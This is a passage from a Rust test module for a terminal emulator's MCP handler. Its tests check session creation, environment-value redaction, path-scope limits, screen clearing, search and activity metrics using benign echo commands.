                    return Err(anyhow!("verification {id} ended as {:?}", record.status));
                }
            }
            if std::time::Instant::now() >= deadline {
                return Err(anyhow!("verification {id} did not pass before deadline"));
            }
            std::thread::sleep(std::time::Duration::from_millis(50));
        }
    }

    fn wait_for_screen_pattern(
        handler: &McpHandler,
        ctx: &ConnectionContext,
        pane_id: usize,
        pattern: &str,
    ) -> Result<Value> {
        let mut search = json!({});
        for _ in 0..20 {
            search = handler.handle(
                ctx,
                "screen.search",
                &json!({
                    "pane_id": pane_id,
                    "pattern": pattern,
                }),
            )?;
            if search["total"].as_u64().unwrap_or_default() > 0 {
                return Ok(search);
            }
            std::thread::sleep(std::time::Duration::from_millis(50));
        }
        Err(anyhow!(
            "screen pattern {pattern:?} was not visible before deadline: {search}"
        ))
    }

    /// Clearing drops the history and keeps what is on screen.
    ///
    /// The reason anyone asks is a pane with a hundred thousand lines behind
    /// it; losing what is currently being read is not part of the request. And
    /// there was no other way to ask: sending `clear` to the shell is a command
    /// the user did not run, and `CSI 3 J` written as input is text the shell
    /// reads rather than a sequence the terminal acts on.
    #[test]
    fn screen_clear_drops_history_and_keeps_the_screen() {
        let _guard = env_lock().lock();
        unterm_engine::install_next_core_provider();
        let previous_engine = std::env::var("UNTERM_ENGINE").ok();
        std::env::set_var("UNTERM_ENGINE", "next-core");

        let result: Result<(usize, usize, usize, usize)> = (|| {
            let handler = McpHandler::new();
            let ctx = ConnectionContext::internal("handler-test");
            let command = if cfg!(windows) {
                "for /L %i in (1,1,120) do @echo clear-me-%i"
            } else {
                "for i in $(seq 1 120); do echo clear-me-$i; done"
            };
            let created = handler.handle(
                &ctx,
                "session.create",
                &json!({ "cols": 80, "rows": 6, "command": command }),
            )?;
            let pane_id = created["id"].as_u64().expect("session id") as usize;
            wait_for_screen_pattern(&handler, &ctx, pane_id, "clear-me-120")?;

            let history = |handler: &McpHandler| -> Result<usize> {
                let read = handler.handle(
                    &ctx,
                    "screen.scrollback_text",
                    &json!({ "pane_id": pane_id, "tail_lines": 4000 }),
                )?;
                Ok(read["lines"]
                    .as_array()
                    .map(|lines| lines.len())
                    .unwrap_or(0))
            };
            let visible = |handler: &McpHandler| -> Result<usize> {
                let read = handler.handle(&ctx, "screen.text", &json!({ "pane_id": pane_id }))?;
                Ok(read["lines"]
                    .as_array()
                    .map(|lines| {
                        lines
                            .iter()
                            .filter(|line| !line.as_str().unwrap_or("").trim().is_empty())
                            .count()
                    })
                    .unwrap_or(0))
            };

            let before = history(&handler)?;
            let seen_before = visible(&handler)?;
            handler.handle(&ctx, "screen.clear", &json!({ "pane_id": pane_id }))?;
            let after = history(&handler)?;
            let seen_after = visible(&handler)?;
            handler.handle(&ctx, "session.destroy", &json!({ "pane_id": pane_id }))?;
            Ok((before, after, seen_before, seen_after))
        })();

        match previous_engine {
            Some(value) => std::env::set_var("UNTERM_ENGINE", value),
            None => std::env::remove_var("UNTERM_ENGINE"),
        }

        let (before, after, seen_before, seen_after) =
            result.expect("clear a next-core pane's history through the MCP handler");
        assert!(before > 100, "the pane never filled up: {before} lines");
        assert!(after < before, "clearing kept {after} of {before} lines");
        assert!(seen_before > 0, "nothing was on screen to keep");
        assert_eq!(
            seen_after, seen_before,
            "clearing the history took the screen with it"
        );
    }

    #[test]
    fn session_destroy_uses_next_core_pane_id_path() {
        let _guard = env_lock().lock();
        unterm_engine::install_next_core_provider();
        let previous_engine = std::env::var("UNTERM_ENGINE").ok();
        std::env::set_var("UNTERM_ENGINE", "next-core");

        let result: Result<(serde_json::Value, usize)> = (|| {
            let handler = McpHandler::new();
            let ctx = ConnectionContext::internal("handler-test");
            let created = handler.handle(
                &ctx,
                "session.create",
                &json!({
                    "cols": 80,
                    "rows": 4,
                }),
            )?;
            let pane_id = created["id"].as_u64().expect("session id") as usize;

            let destroyed =
                handler.handle(&ctx, "session.destroy", &json!({ "pane_id": pane_id }))?;
            Ok((destroyed, pane_id))
        })();

        match previous_engine {
            Some(value) => std::env::set_var("UNTERM_ENGINE", value),
            None => std::env::remove_var("UNTERM_ENGINE"),
        }

        let (destroyed, pane_id) = result.expect("destroy next-core session through MCP handler");
        assert_eq!(destroyed["destroyed"], true);
        assert!(next_core().get_session(pane_id).is_err());
    }

    #[test]
    fn session_env_reads_next_core_launch_env_keys_without_values() {
        let _guard = env_lock().lock();
        unterm_engine::install_next_core_provider();
        let previous_engine = std::env::var("UNTERM_ENGINE").ok();
        std::env::set_var("UNTERM_ENGINE", "next-core");

        let result: Result<(serde_json::Value, usize)> = (|| {
            let engine = next_core();
            let launch_env = vec![
                ("GITHUB_TOKEN".to_string(), "secret-token".to_string()),
                ("UNTERM_PROFILE".to_string(), "work-acme".to_string()),
                (
                    "HTTPS_PROXY".to_string(),
                    "http://127.0.0.1:7890".to_string(),
                ),
            ];
            let session = engine.create_session(CreateSessionRequest {
                cols: 80,
                rows: 4,
                command_dir: None,
                command: None,
                env: launch_env,
                launch_policy: Default::default(),
            })?;
            let handler = McpHandler::new();
            let ctx = ConnectionContext::internal("handler-test");
            let env = handler.handle(&ctx, "session.env", &json!({ "pane_id": session.id }))?;
            Ok((env, session.id))
        })();

        match previous_engine {
            Some(value) => std::env::set_var("UNTERM_ENGINE", value),
            None => std::env::remove_var("UNTERM_ENGINE"),
        }

        let (env, pane_id) = result.expect("read next-core launch env through MCP handler");
        assert_eq!(env["supported"], true);
        assert_eq!(env["mutable"], false);
        let variable_names = env["variables"]
            .as_array()
            .expect("variables array")
            .iter()
            .map(|var| var["name"].as_str().unwrap_or_default().to_string())
            .collect::<Vec<_>>();
        assert_eq!(
            variable_names,
            vec!["GITHUB_TOKEN", "HTTPS_PROXY", "UNTERM_PROFILE"]
        );
        for variable in env["variables"].as_array().expect("variables array") {
            assert_eq!(variable["value"], Value::Null);
            assert_eq!(variable["redacted"], true);
        }
        assert_eq!(env["launch_context"]["profile"], "work-acme");
        assert_eq!(env["launch_context"]["proxy_env_keys"][0], "HTTPS_PROXY");
        assert_eq!(env["launch_context"]["env_key_count"], 3);
        assert_eq!(
            env["launch_context"]["policy"]["profile"],
            Value::String("work-acme".to_string())
        );
        assert_eq!(
            env["launch_context"]["policy"]["domain"]["decision"],
            "not_requested"
        );
        assert_eq!(
            env["launch_context"]["policy"]["privilege"]["decision"],
            "not_requested"
        );
        assert_eq!(
            env["launch_context"]["policy"]["proxy_rotation"]["decision"],
            "deferred"
        );
        assert_eq!(
            env["launch_context"]["policy"]["restart"]["decision"],
            "not_requested"
        );
        let policy_sources = env["launch_context"]["policy"]["env"]
            .as_array()
            .expect("policy env array")
            .iter()
            .map(|binding| {
                (
                    binding["key"].as_str().unwrap_or_default().to_string(),
                    binding["source"].as_str().unwrap_or_default().to_string(),
                )
            })
            .collect::<Vec<_>>();
        assert_eq!(
            policy_sources,
            vec![
                ("GITHUB_TOKEN".to_string(), "Explicit".to_string()),
                ("UNTERM_PROFILE".to_string(), "Profile".to_string()),
                ("HTTPS_PROXY".to_string(), "Proxy".to_string())
            ]
        );
        next_core().destroy_session(pane_id).ok();
    }

    #[test]
    fn session_set_env_applies_next_core_future_launch_overlay_without_values() {
        let _guard = env_lock().lock();
        unterm_engine::install_next_core_provider();
        let previous_engine = std::env::var("UNTERM_ENGINE").ok();
        std::env::set_var("UNTERM_ENGINE", "next-core");
        {
            let mut state = mcp_state().lock();
            state.launch_env_overlay.remove("UNTERM_PROFILE");
            state.launch_env_overlay.remove("HTTPS_PROXY");
        }

        let result: Result<(
            serde_json::Value,
            serde_json::Value,
            serde_json::Value,
            serde_json::Value,
            usize,
        )> = (|| {
            let handler = McpHandler::new();
            let ctx = ConnectionContext::internal("handler-test");
            let profile_set = handler.handle(
                &ctx,
                "session.set_env",
                &json!({
                    "name": "UNTERM_PROFILE",
                    "value": "overlay-profile",
                }),
            )?;
            let proxy_set = handler.handle(
                &ctx,
                "session.set_env",
                &json!({
                    "name": "HTTPS_PROXY",
                    "value": "http://127.0.0.1:7890",
                }),
            )?;
            let session = handler.handle(
                &ctx,
                "session.create",
                &json!({
                    "cols": 80,
                    "rows": 4,
                    "command": "echo next-core-launch-overlay",
                }),
            )?;
            let pane_id = session["id"].as_u64().expect("session id") as usize;
            let env = handler.handle(&ctx, "session.env", &json!({ "pane_id": pane_id }))?;
            let _ = handler.handle(&ctx, "session.destroy", &json!({ "pane_id": pane_id }));
            Ok((profile_set, proxy_set, session, env, pane_id))
        })();

        {
            let mut state = mcp_state().lock();
            state.launch_env_overlay.remove("UNTERM_PROFILE");
            state.launch_env_overlay.remove("HTTPS_PROXY");
        }
        match previous_engine {
            Some(value) => std::env::set_var("UNTERM_ENGINE", value),
            None => std::env::remove_var("UNTERM_ENGINE"),
        }

        let (profile_set, proxy_set, session, env, pane_id) =
            result.expect("future launch overlay applies through next-core");
        assert!(next_core().get_session(pane_id).is_err());
        assert_eq!(profile_set["supported"], true);
        assert_eq!(profile_set["scope"], "future_launch");
        assert_eq!(proxy_set["supported"], true);
        assert_eq!(proxy_set["scope"], "future_launch");
        assert_eq!(session["launch"]["context"]["profile"], "overlay-profile");
        assert_eq!(session["launch"]["decision"]["source"], "session.create");
        assert_eq!(session["launch"]["decision"]["profile_requested"], false);
        assert_eq!(session["launch"]["decision"]["command_provided"], true);
        assert_eq!(
            session["launch"]["decision"]["command_source"],
            "explicit_command"
        );
        assert_eq!(session["launch"]["decision"]["default_shell"], Value::Null);
        assert_eq!(
            session["launch"]["decision"]["policy"]["proxy_rotation"]["decision"],
            "deferred"
        );
        assert_eq!(session["launch"]["decision"]["values_redacted"], true);
        let launch_overlay_keys = session["launch"]["decision"]["overlay_env_keys"]
            .as_array()
            .expect("launch overlay keys");
        assert!(launch_overlay_keys
            .iter()
            .any(|key| key.as_str() == Some("UNTERM_PROFILE")));
        assert!(launch_overlay_keys
            .iter()
            .any(|key| key.as_str() == Some("HTTPS_PROXY")));
        let launch_proxy_keys = session["launch"]["decision"]["proxy_env_keys"]
            .as_array()
            .expect("launch proxy keys");
        assert!(launch_proxy_keys
            .iter()
            .any(|key| key.as_str() == Some("HTTPS_PROXY")));
        assert!(!session.to_string().contains("http://127.0.0.1:7890"));
        let variable_names = env["variables"]
            .as_array()
            .expect("variables array")
            .iter()
            .map(|var| var["name"].as_str().unwrap_or_default().to_string())
            .collect::<Vec<_>>();
        assert!(variable_names.contains(&"UNTERM_PROFILE".to_string()));
        assert!(variable_names.contains(&"HTTPS_PROXY".to_string()));
        for variable in env["variables"].as_array().expect("variables array") {
            assert_eq!(variable["value"], Value::Null);
            assert_eq!(variable["redacted"], true);
        }
        assert_eq!(env["launch_context"]["profile"], "overlay-profile");
        let proxy_keys = env["launch_context"]["proxy_env_keys"]
            .as_array()
            .expect("proxy env keys");
        assert!(proxy_keys
            .iter()
            .any(|key| key.as_str() == Some("HTTPS_PROXY")));
        let policy_sources = env["launch_context"]["policy"]["env"]
            .as_array()
            .expect("policy env array")
            .iter()
            .map(|binding| {
                (
                    binding["key"].as_str().unwrap_or_default().to_string(),
                    binding["source"].as_str().unwrap_or_default().to_string(),
                )
            })
            .collect::<Vec<_>>();
        assert!(policy_sources.contains(&("UNTERM_PROFILE".to_string(), "Overlay".to_string())));
        assert!(policy_sources.contains(&("HTTPS_PROXY".to_string(), "Overlay".to_string())));
        let audit: Value = serde_json::from_str(&audit_log_snapshot_json(200)).expect("audit JSON");
        assert!(
            audit.as_array().is_some_and(|entries| entries
                .iter()
                .any(|entry| entry["method"].as_str() == Some("session.set_env"))),
            "dispatch fallback must audit mutating methods without a leaf audit"
        );
    }

    #[test]
    fn session_create_reports_default_shell_launch_decision() {
        let _guard = env_lock().lock();
        unterm_engine::install_next_core_provider();
        let previous_engine = std::env::var("UNTERM_ENGINE").ok();
        std::env::set_var("UNTERM_ENGINE", "next-core");

        let result: Result<(Value, usize)> = (|| {
            let handler = McpHandler::new();
            let ctx = ConnectionContext::internal("handler-test");
            let session = handler.handle(
                &ctx,
                "session.create",
                &json!({
                    "cols": 80,
                    "rows": 4,
                }),
            )?;
            let pane_id = session["id"].as_u64().expect("session id") as usize;
            let _ = handler.handle(&ctx, "session.destroy", &json!({ "pane_id": pane_id }));
            Ok((session, pane_id))
        })();

        match previous_engine {
            Some(value) => std::env::set_var("UNTERM_ENGINE", value),
            None => std::env::remove_var("UNTERM_ENGINE"),
        }

        let (session, pane_id) = result.expect("create next-core default shell session");
        assert!(next_core().get_session(pane_id).is_err());
        let decision = &session["launch"]["decision"];
        assert_eq!(decision["source"], "session.create");
        assert_eq!(decision["command_provided"], false);
        assert_eq!(decision["command_source"], "default_shell");
        assert_eq!(
            decision["default_shell"]["source"],
            "portable_pty.default_prog"
        );
        assert_eq!(decision["default_shell"]["values_redacted"], true);
        assert!(decision["default_shell"]["shell"]
            .as_str()
            .map(|shell| !shell.trim().is_empty())
            .unwrap_or(false));
    }

    #[test]
    fn session_create_requires_write_scope_for_initial_cwd() {
        let dir = std::env::temp_dir().join(format!(
            "unterm-mcp-path-scope-{}",
            uuid::Uuid::new_v4()
        ));
        let read_only = dir.join("read-only");
        std::fs::create_dir_all(&read_only).unwrap();
        let handler = McpHandler::new();
        let ctx = ConnectionContext::internal("handler-test");

        let error = handler
            .handle(
                &ctx,
                "session.create",
                &json!({
                    "cwd": read_only,
                    "path_scope": {
                        "read_paths": [read_only],
                        "write_paths": [],
                        "deny_paths": [],
                    },
                }),
            )
            .expect_err("read-only path scope must not permit a new PTY cwd");

        assert!(
            error.to_string().contains("path_scope_write_outside_scope"),
            "unexpected error: {error:#}"
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn session_split_requires_write_scope_for_requested_cwd() {
        let _guard = env_lock().lock();
        unterm_engine::install_next_core_provider();
        let previous_engine = std::env::var("UNTERM_ENGINE").ok();
        std::env::set_var("UNTERM_ENGINE", "next-core");

        let result: Result<(String, usize)> = (|| {
            let dir = std::env::temp_dir().join(format!(
                "unterm-mcp-path-scope-{}",
                uuid::Uuid::new_v4()
            ));
            let read_only = dir.join("read-only");
            std::fs::create_dir_all(&read_only).unwrap();
            let handler = McpHandler::new();
            let ctx = ConnectionContext::internal("handler-test");
            let session = handler.handle(
                &ctx,
                "session.create",
                &json!({
                    "cols": 80,
                    "rows": 4,
                }),
            )?;
            let pane_id = session["id"].as_u64().expect("session id") as usize;
            let error = handler
                .handle(
                    &ctx,
                    "session.split",
                    &json!({
                        "pane_id": pane_id,
                        "cwd": read_only,
                        "path_scope": {
                            "read_paths": [read_only],
                            "write_paths": [],
                            "deny_paths": [],
                        },
                    }),
                )
                .expect_err("read-only path scope must not permit split cwd");
            let _ = handler.handle(&ctx, "session.destroy", &json!({ "pane_id": pane_id }));
            let _ = std::fs::remove_dir_all(&dir);
            Ok((error.to_string(), pane_id))
        })();

        match previous_engine {
            Some(value) => std::env::set_var("UNTERM_ENGINE", value),
            None => std::env::remove_var("UNTERM_ENGINE"),
        }

        let (error, pane_id) = result.expect("split path scope rejection");
        assert!(next_core().get_session(pane_id).is_err());
        assert!(
            error.contains("path_scope_write_outside_scope"),
            "unexpected error: {error}"
        );
    }

    #[test]
    fn session_create_accepts_explicit_argv_without_shell_wrapping() {
        let _guard = env_lock().lock();
        unterm_engine::install_next_core_provider();
        let previous_engine = std::env::var("UNTERM_ENGINE").ok();
        std::env::set_var("UNTERM_ENGINE", "next-core");

        let result: Result<(Value, usize)> = (|| {
            let handler = McpHandler::new();
            let ctx = ConnectionContext::internal("handler-test");
            let argv = if cfg!(windows) {
                json!(["cmd.exe", "/C", "echo next-core-explicit-argv"])
            } else {
                json!(["/bin/sh", "-lc", "echo next-core-explicit-argv"])
            };
            let session = handler.handle(
                &ctx,
                "session.create",
                &json!({
                    "cols": 80,
                    "rows": 4,
                    "argv": argv,
                }),
            )?;
            let pane_id = session["id"].as_u64().expect("session id") as usize;
            let _ = handler.handle(&ctx, "session.destroy", &json!({ "pane_id": pane_id }));
            Ok((session, pane_id))
        })();

        match previous_engine {
            Some(value) => std::env::set_var("UNTERM_ENGINE", value),
            None => std::env::remove_var("UNTERM_ENGINE"),
        }

        let (session, pane_id) = result.expect("create next-core argv session");
        assert!(next_core().get_session(pane_id).is_err());
        assert_eq!(session["command"], Value::Null);
        assert_eq!(session["launch"]["decision"]["command_provided"], true);
        assert_eq!(
            session["launch"]["decision"]["command_source"],
            "explicit_argv"
        );
        assert_eq!(session["launch"]["decision"]["default_shell"], Value::Null);
        let argv = session["argv"].as_array().expect("argv array");
        assert!(argv.len() >= 3);
        assert_eq!(
            session["title"].as_str().unwrap_or_default(),
            argv[0].as_str().unwrap_or_default()
        );
    }

    #[test]
    fn session_create_reports_explicit_launch_policy_requests() {
        let _guard = env_lock().lock();
        unterm_engine::install_next_core_provider();
        let previous_engine = std::env::var("UNTERM_ENGINE").ok();
        std::env::set_var("UNTERM_ENGINE", "next-core");

        let result: Result<Value> = (|| {
            let handler = McpHandler::new();
            let ctx = ConnectionContext::internal("handler-test");
            let session = handler.handle(
                &ctx,
                "session.create",
                &json!({
                    "cols": 80,
                    "rows": 4,
                    "command": "echo next-core-launch-policy-requests",
                    "domain": "ssh:prod",
                    "privilege": true,
                    "proxy_rotation": true,
                    "restart": true,
                }),
            )?;
            let pane_id = session["id"].as_u64().expect("session id") as usize;
            let _ = handler.handle(&ctx, "session.destroy", &json!({ "pane_id": pane_id }));
            Ok(session)
        })();

        match previous_engine {
            Some(value) => std::env::set_var("UNTERM_ENGINE", value),
            None => std::env::remove_var("UNTERM_ENGINE"),
        }

        let session = result.expect("session.create reports requested launch policy decisions");
        let policy = &session["launch"]["decision"]["policy"];
        assert_eq!(policy["domain"]["decision"], "unsupported");
        assert_eq!(policy["domain"]["supported"], false);
        assert!(policy["domain"]["reason"]
            .as_str()
            .expect("domain reason")
            .contains("ssh:prod"));
        assert_eq!(policy["privilege"]["decision"], "unsupported");
        assert_eq!(policy["privilege"]["supported"], false);
        assert_eq!(policy["proxy_rotation"]["decision"], "deferred");
        assert_eq!(policy["proxy_rotation"]["supported"], false);
        assert_eq!(policy["restart"]["decision"], "unsupported");
        assert_eq!(policy["restart"]["supported"], false);
        assert_eq!(session["launch"]["decision"]["values_redacted"], true);
    }

    #[test]
    fn workspace_restore_dry_run_reports_template_launch_decisions() {
        let _guard = env_lock().lock();
        unterm_engine::install_next_core_provider();
        let previous_engine = std::env::var("UNTERM_ENGINE").ok();
        std::env::set_var("UNTERM_ENGINE", "next-core");

        let name = format!("unterm-workspace-plan-test-{}", std::process::id());
        // Resolved the same way workspace_restore resolves it, so the fixture
        // lands where the code under test will look for it.
        let dir = unterm_protocol::state_dir()
            .unwrap_or_else(|| std::path::PathBuf::from(".unterm"))
            .join("workspaces");
        let path = dir.join(format!("{name}.json"));
        let result: Result<Value> = (|| {
            std::fs::create_dir_all(&dir)?;
            let workspace = json!({
                "name": name,
                "sessions": [
                    {
                        "id": 42,
                        "title": "saved shell",
                        "cwd": "D:\\code\\unterm",
                        "profile": "saved-profile",
                        "command": "echo workspace-restore"
                    }
                ],
                "saved_at": "2026-07-27T00:00:00+08:00"
            });
            std::fs::write(&path, serde_json::to_string_pretty(&workspace)?)?;

            let handler = McpHandler::new();
            let ctx = ConnectionContext::internal("handler-test");
            handler.handle(
                &ctx,
                "workspace.restore",
                &json!({
                    "name": name,
                    "dry_run": true,
                }),
            )
        })();

        let _ = std::fs::remove_file(&path);
        match previous_engine {
            Some(value) => std::env::set_var("UNTERM_ENGINE", value),
            None => std::env::remove_var("UNTERM_ENGINE"),
        }

        let restored = result.expect("restore workspace dry-run launch plan");
        assert_eq!(restored["dry_run"], true);
        assert_eq!(restored["restored"], false);
        assert_eq!(restored["created"].as_array().expect("created").len(), 0);
        let decision = &restored["planned"][0]["launch"]["decision"];
        assert_eq!(decision["source"], "workspace.restore");
        assert_eq!(decision["saved_id"], 42);
        assert_eq!(decision["title"], "saved shell");
        assert_eq!(decision["cwd_provided"], true);
        assert_eq!(decision["profile_requested"], true);
        assert_eq!(decision["command_provided"], true);
        assert_eq!(decision["values_redacted"], true);
    }

    #[test]
    fn activity_methods_expose_next_core_io_metrics() {
        let _guard = env_lock().lock();
        unterm_engine::install_next_core_provider();
        let previous_engine = std::env::var("UNTERM_ENGINE").ok();
        std::env::set_var("UNTERM_ENGINE", "next-core");

        let result: Result<(serde_json::Value, serde_json::Value, usize)> = (|| {
            let engine = next_core();
            let command = if cfg!(windows) {
                "echo next-core-activity-metrics && ping -n 30 127.0.0.1 >nul"
            } else {
                "echo next-core-activity-metrics; sleep 30"
            };
            let session = engine.create_session(CreateSessionRequest {
                cols: 80,
                rows: 4,
                command_dir: None,
                command: Some(shell_command_builder(command)),
                env: Vec::new(),
                launch_policy: Default::default(),
            })?;
            let pane_id = session.id;

            let handler = McpHandler::new();
            let ctx = ConnectionContext::internal("handler-test");
            for _ in 0..100 {
                let search = handler.handle(
                    &ctx,
                    "screen.search",
                    &json!({
                        "pane_id": pane_id,
                        "pattern": "next-core-activity-metrics",
                    }),
                )?;
                if search["total"].as_u64().unwrap_or_default() > 0 {
                    break;
                }
                std::thread::sleep(std::time::Duration::from_millis(50));
            }

            engine.write_input(pane_id, "abc")?;
            engine.paste_input(pane_id, "AUTH-CODE-123456")?;

            let idle = handler.handle(&ctx, "session.idle", &json!({ "pane_id": pane_id }))?;
            let status = handler.handle(&ctx, "exec.status", &json!({ "pane_id": pane_id }))?;
            let _ = handler.handle(&ctx, "session.destroy", &json!({ "pane_id": pane_id }));
            Ok((idle, status, pane_id))
        })();

        match previous_engine {
            Some(value) => std::env::set_var("UNTERM_ENGINE", value),
            None => std::env::remove_var("UNTERM_ENGINE"),
        }

        let (idle, status, pane_id) = result.expect("read next-core activity metrics");
        assert!(next_core().get_session(pane_id).is_err());
        assert!(idle["input"]["total_writes"].as_u64().unwrap_or_default() >= 2);
        assert!(idle["input"]["total_bytes"].as_u64().unwrap_or_default() >= 19);
        assert!(idle["output"]["total_bytes"].as_u64().unwrap_or_default() > 0);
        assert_eq!(idle["paste"]["total_pastes"], 1);
        assert_eq!(idle["paste"]["last_text_bytes"], 16);
        // Input and paste move only when this test writes, so two samples of
        // them must agree exactly.
        assert_eq!(status["input"], idle["input"]);
        assert_eq!(status["paste"], idle["paste"]);
        // Output is the one counter the session advances on its own. The tty
        // echoes back the 19 bytes just written -- "abc" plus the 16-byte
        // paste -- at a moment neither call controls, so a sample taken after
        // `session.idle` can legitimately have grown by exactly that much.
        // Demanding equality made this a coin toss on a loaded runner: it lost
        // once on macOS during the 0.66.0 release while the same commit passed
        // on Linux and Windows. What the two methods actually promise is one
        // counter read twice, so assert what that means -- same shape, never
        // going backwards.
        let sampled = |value: &serde_json::Value, key: &str| {
            value["output"][key].as_u64().unwrap_or_default()
        };
        for key in ["total_bytes", "total_chunks", "recorded_chunks"] {
            assert!(
                sampled(&status, key) >= sampled(&idle, key),
                "exec.status reported a smaller output {key} than session.idle: {} < {}",
                sampled(&status, key),
                sampled(&idle, key)
            );
        }
        assert_eq!(
            status["output"]["last_recorded"], idle["output"]["last_recorded"],
            "recording state is not something the shell changes on its own"
        );
    }

    #[test]
    fn core_status_history_cursor_methods_use_next_core_engine() {
        let _guard = env_lock().lock();
        unterm_engine::install_next_core_provider();
        let previous_engine = std::env::var("UNTERM_ENGINE").ok();
        std::env::set_var("UNTERM_ENGINE", "next-core");

        #[cfg(windows)]
        let command = "for /L %i in (1,1,8) do @echo next-core-core-parity-%i";
        #[cfg(not(windows))]
        let command = "for i in 1 2 3 4 5 6 7 8; do echo next-core-core-parity-$i; done";

        let result: Result<(
            serde_json::Value,
            serde_json::Value,
            serde_json::Value,
            usize,
        )> = (|| {
            let handler = McpHandler::new();
            let ctx = ConnectionContext::internal("handler-test");
            let created = handler.handle(
                &ctx,
                "session.create",
                &json!({
                    "cols": 80,
                    "rows": 3,
                    "command": command,
                }),
            )?;
            let pane_id = created["id"].as_u64().expect("session id") as usize;
            wait_for_screen_pattern(&handler, &ctx, pane_id, "next-core-core-parity-8")?;

            let history = handler.handle(
                &ctx,
                "session.history",
                &json!({
                    "pane_id": pane_id,
                    "limit": 20,
                }),
            )?;
            let cursor = handler.handle(&ctx, "screen.cursor", &json!({ "pane_id": pane_id }))?;
            let status = handler.handle(&ctx, "exec.status", &json!({ "pane_id": pane_id }))?;
            let _ = handler.handle(&ctx, "session.destroy", &json!({ "pane_id": pane_id }));

            Ok((history, cursor, status, pane_id))
        })();

        match previous_engine {
            Some(value) => std::env::set_var("UNTERM_ENGINE", value),
            None => std::env::remove_var("UNTERM_ENGINE"),
        }

        let (history, cursor, status, pane_id) =
            result.expect("core status/history/cursor methods use next-core");
        assert!(next_core().get_session(pane_id).is_err());
        let entries = history["entries"].as_array().expect("history entries");
        assert!(entries
            .iter()
            .any(|entry| entry["text"].as_str() == Some("next-core-core-parity-1")));
        assert_eq!(
            history["count"].as_u64().unwrap_or_default(),
            entries.len() as u64
        );
        assert!(cursor["x"].as_u64().unwrap_or(usize::MAX as u64) < 80);
        assert!(cursor["y"].as_u64().unwrap_or(usize::MAX as u64) < 3);
        assert!(cursor["shape"]
            .as_str()
            .unwrap_or_default()
            .contains("Default"));
        assert!(matches!(
            status["status"].as_str(),
            Some("idle") | Some("running")
        ));
        assert!(
            status["output"]["total_chunks"]
                .as_u64()
                .unwrap_or_default()
                > 0
        );
        assert!(status["output"]["total_bytes"].as_u64().unwrap_or_default() > 0);
        assert!(status["process"]["root_pid"].as_u64().is_some());
    }

    #[test]
    fn screen_detect_errors_uses_next_core_screen_snapshot() {
        let _guard = env_lock().lock();
        unterm_engine::install_next_core_provider();
        let previous_engine = std::env::var("UNTERM_ENGINE").ok();
        std::env::set_var("UNTERM_ENGINE", "next-core");

        let result: Result<(serde_json::Value, usize)> = (|| {
            let handler = McpHandler::new();
            let ctx = ConnectionContext::internal("handler-test");
            let created = handler.handle(
                &ctx,
                "session.create",
                &json!({
                    "cols": 80,
                    "rows": 4,
                    "command": "echo Error: next-core-detect-errors",
                }),
            )?;
            let pane_id = created["id"].as_u64().expect("session id") as usize;
            wait_for_screen_pattern(&handler, &ctx, pane_id, "next-core-detect-errors")?;

            let detect = handler.handle(
                &ctx,
                "screen.detect_errors",
                &json!({
                    "pane_id": pane_id,
                }),
            )?;
            let _ = handler.handle(&ctx, "session.destroy", &json!({ "pane_id": pane_id }));

            Ok((detect, pane_id))
        })();

        match previous_engine {
            Some(value) => std::env::set_var("UNTERM_ENGINE", value),
            None => std::env::remove_var("UNTERM_ENGINE"),
        }

        let (detect, pane_id) = result.expect("detect errors through next-core screen snapshot");
        assert!(next_core().get_session(pane_id).is_err());
        assert_eq!(detect["has_errors"], true);
        let errors = detect["errors"].as_array().expect("errors array");
        assert!(
            errors.iter().any(|error| {
                error["pattern"] == "Error:"
                    && error["text"]
                        .as_str()
                        .unwrap_or_default()
                        .contains("next-core-detect-errors")
            }),
            "screen.detect_errors did not report next-core marker: {}",
            detect
        );
    }

    #[test]
    fn screen_search_goto_scrolls_next_core_logical_viewport() {
        let _guard = env_lock().lock();
        unterm_engine::install_next_core_provider();
        let previous_engine = std::env::var("UNTERM_ENGINE").ok();
        std::env::set_var("UNTERM_ENGINE", "next-core");

        let result: Result<(serde_json::Value, serde_json::Value, usize)> = (|| {
            let handler = McpHandler::new();
            let ctx = ConnectionContext::internal("handler-test");
            let command = if cfg!(windows) {
                "for /L %i in (1,1,8) do @echo next-core-goto-%i"
            } else {
                "for i in 1 2 3 4 5 6 7 8; do echo next-core-goto-$i; done"
            };
            let created = handler.handle(
                &ctx,
                "session.create",
                &json!({
                    "cols": 80,
                    "rows": 3,
                    "command": command
                }),
            )?;
            let pane_id = created["id"].as_u64().expect("session id") as usize;

            let mut search = json!({});
            for _ in 0..100 {
                search = handler.handle(
                    &ctx,
                    "screen.search",
                    &json!({
                        "pane_id": pane_id,
                        "pattern": "next-core-goto-2",
                        "goto": true,
                    }),
                )?;
                if search["total"].as_u64().unwrap_or_default() > 0 {
                    break;
                }
                std::thread::sleep(std::time::Duration::from_millis(50));
            }

            let text = handler.handle(&ctx, "screen.text", &json!({ "pane_id": pane_id }))?;
            let _ = handler.handle(&ctx, "session.destroy", &json!({ "pane_id": pane_id }));
            Ok((search, text, pane_id))
        })();

        match previous_engine {
            Some(value) => std::env::set_var("UNTERM_ENGINE", value),
            None => std::env::remove_var("UNTERM_ENGINE"),
        }

        let (search, text, pane_id) = result.expect("search next-core session through MCP handler");
        assert!(next_core().get_session(pane_id).is_err());
        assert!(search["total"].as_u64().unwrap_or_default() > 0);
        assert_eq!(search["goto_skipped"], Value::Null);
        assert_eq!(search["scrolled_to"]["row"], 1);
        assert_eq!(search["scrolled_to"]["match_index"], 0);
        let visible = text["lines"].as_array().expect("visible lines");
        assert!(visible
            .iter()
            .any(|line| line.as_str() == Some("next-core-goto-2")));
    }

    #[test]
    fn screen_scroll_goto_updates_next_core_logical_viewport() {
        let _guard = env_lock().lock();
        unterm_engine::install_next_core_provider();
        let previous_engine = std::env::var("UNTERM_ENGINE").ok();
        std::env::set_var("UNTERM_ENGINE", "next-core");

        let result: Result<(serde_json::Value, serde_json::Value, usize)> = (|| {
            let handler = McpHandler::new();
            let ctx = ConnectionContext::internal("handler-test");
            let command = if cfg!(windows) {
                "for /L %i in (1,1,8) do @echo next-core-scroll-%i"
            } else {
                "for i in 1 2 3 4 5 6 7 8; do echo next-core-scroll-$i; done"
            };
            let created = handler.handle(
                &ctx,
                "session.create",
                &json!({
                    "cols": 80,
                    "rows": 3,
                    "command": command
                }),
            )?;
            let pane_id = created["id"].as_u64().expect("session id") as usize;

            let mut scrolled = json!({});
            for _ in 0..100 {
                let search = handler.handle(
                    &ctx,
                    "screen.search",
                    &json!({
                        "pane_id": pane_id,
